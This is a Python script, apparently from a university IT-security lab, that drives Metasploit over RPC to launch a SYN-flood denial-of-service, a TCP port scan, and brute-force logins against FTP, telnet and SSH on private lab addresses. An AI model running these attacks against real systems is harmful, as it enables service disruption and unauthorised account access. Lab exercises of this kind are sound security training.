from pymetasploit3.msfrpc import MsfRpcClient
from packet import send_packet

class Metasploit:
    def __init__(self):
        # Start metasploit rpc server with msfrpcd -P kali
        # The MsfRpcClient class provides the core functionality to navigate through the Metasploit framework.
        self.client = MsfRpcClient('kali', ssl=True)
        for console in self.client.consoles.list:
            self.client.consoles.console(console["id"]).destroy()

        self.cid = self.client.consoles.console().cid

    # Start a denial-of-service (dos) attack
    # It sends a bunch of tcp handshakes to the target
    def dos_attack(self, ip: str):
        exploit = self.client.modules.use('auxiliary', 'dos/tcp/synflood')
        exploit['RHOSTS'] = ip
        print(exploit.description)
        #exploit.execute()
        #print(self.client.sessions.list)
        print(self.client.consoles.console(self.cid).run_module_with_output(exploit))

    def tcp_portscan_attack(self, ip: str):
        exploit = self.client.modules.use('auxiliary', 'scanner/portscan/tcp')
        exploit['RHOSTS'] = ip
        #print(exploit.description)
        #print(exploit.execute())

        print(self.client.consoles.console(self.cid).run_module_with_output(exploit))

    # Brute-force login attack on ftp, telnet and ssh
    def brute_force_login(self, ip: str, service: str):
        if(service == 'ftp'):
            exploit = self.client.modules.use('auxiliary', 'scanner/ftp/ftp_login')
        elif(service == 'telnet'):
            exploit = self.client.modules.use('auxiliary', 'scanner/telnet/telnet_login')
        elif(service == 'ssh'):
            exploit = self.client.modules.use('auxiliary', 'scanner/ssh/ssh_login')
        exploit['RHOSTS'] = ip
        #exploit['PASS_FILE'] = '/home/kali/git/it-sicherheit-prakitkum/telnet_default_pass.txt'
        exploit['USERPASS_FILE'] = '/home/kali/git/it-sicherheit-prakitkum/user_pass.txt'

        print(self.client.consoles.console(self.cid).run_module_with_output(exploit))
        # print(exploit.description)
        # exploit.execute()


    # Use dir(client) to see the callable methods.
    #print(dir(self.client))

    # Explore exploit modules
    #for i in client.modules.exploits:
    #    print(i)

    # Create an exploit module object
    # exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
    #exploit = client.modules.use('auxiliary', 'auxiliary/scanner/portscan/tcp')

    # Explore exploit information:
    #print(exploit.description)

if __name__ == "__main__":
    #metaspl = Metasploit()
    send_packet("brute", "192.168.12.251", "start")
    #metaspl.tcp_portscan_attack('192.168.12.251')
    #metaspl.brute_force_login('192.168.12.251', 'telnet')
    #metaspl.dos_attack('192.168.12.251')
    send_packet("dos", "192.168.12.251", "stop")
    #metaspl.brute_force_login('127.0.0.1', 'ssh')
